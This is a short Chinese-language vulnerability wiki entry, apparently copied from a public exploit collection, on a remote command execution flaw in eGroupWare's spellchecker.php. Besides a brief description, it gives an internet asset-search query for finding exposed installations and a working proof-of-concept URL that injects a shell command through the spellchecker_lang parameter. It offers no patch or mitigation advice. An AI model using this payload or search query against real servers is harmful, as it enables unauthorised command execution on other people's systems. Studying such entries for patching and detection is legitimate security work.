---
title: "eGroupWare spellchecker.php 远程命令执行漏洞"
date: 2026-10-16 09:09:50
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "eGroupWare"
tags:
  - "eGroupWare"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

*eGroupWare*是一个多用户，在以PHP为基础的API上的定制集为基础开发的，以WEB为基础的工作件套装，其中 spellchecker.php 文件中存在命令执行漏洞

## 漏洞影响

```
eGroupWare
```

## 网络测绘

```
app="EGROUPWARE-产品"
```

## 漏洞复现

登录页面

![image-20220524171233435](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241712519.png)

验证POC

```
/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cid%7C%7C
```

![image-20220524171251702](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241712784.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/eGroupWare-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
